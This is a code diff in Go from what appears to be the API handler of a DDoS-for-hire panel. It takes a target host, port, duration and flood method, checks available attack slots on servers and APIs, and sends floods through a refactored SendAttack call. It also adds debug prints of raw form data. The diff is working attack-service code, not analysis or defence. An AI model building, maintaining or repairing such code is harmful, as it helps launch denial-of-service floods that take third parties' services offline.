@@ -24,7 +24,6 @@ func init() {
 			Message string `json:"message"`
 			Attacks []int  `json:"attack_ids"`
 		}
-		errChan := make(chan error)
 		handleError := func(message string) {
 			json.NewEncoder(w).Encode(status{Status: "error", Message: message})
 		}
@@ -42,7 +41,7 @@ func init() {
 			}
 			//get parms change if needed
 			data := functions.GetQuerys(w, r, map[string]bool{
-				"target":      true,
+				"host":      true,
 				"port":        true,
 				"time":        true,
 				"method":      true,
@@ -55,7 +54,7 @@ func init() {
 				return
 			}
 			//validate ip
-			target := data["target"]
+			target := data["host"]
 			if target == "" {
 				handleError("Target parameter is missing")
 				return
@@ -126,35 +125,20 @@ func init() {
 					return
 				}
 			case 2:
-				if database.Container.GlobalRunningType(2) >= servers.Slots()[2] {
+				if database.Container.GlobalRunningType(2) >= servers.Slots()[2]+apis.Slots() {
 					handleError("No available slot to start attack!")
 					return
 				}
 			}					
-			//send to apis
-			go func() {
-				errChan <- apis.Send(flood)
-			}()
-			if err := <-errChan; err != nil {
+			successMsg, err := SendAttack(conns, flood)
+			if err != nil {
 				handleError(err.Error())
 				return
-			}
-			//send to servers
-			for i := 0; i < conns; i++ {
-				go func() {
-					errChan <- servers.Distribute(flood)
-				}()
-			}
-			for i := 0; i < conns; i++ {
-				if err := <-errChan; err != nil {
-					handleError(err.Error())
-					return
-				}
 			}
 			//save attack
 			var ids []int
 			SaveToDB(key, flood, conns)
-			functions.WriteJson(w, status{Status: "success", Message: "attack succesfully started", Attacks: ids})
+			functions.WriteJson(w, status{Status: "success", Message: successMsg, Attacks: ids})
 		case "post":
 			//validate for panal
 			ok, user := sessions.IsLoggedIn(w, r)
@@ -162,7 +146,9 @@ func init() {
 				return
 			}
 			r.ParseForm()
-			fmt.Println(r.PostForm)
+
+fmt.Println("Raw Form Data:", r.Form)       // Prints all data
+fmt.Println("Raw PostForm Data:", r.PostForm) 
 			//validate ip
 			target := r.PostFormValue("host")
 			if err := ValidateTarget(target, blacklists); err != nil {
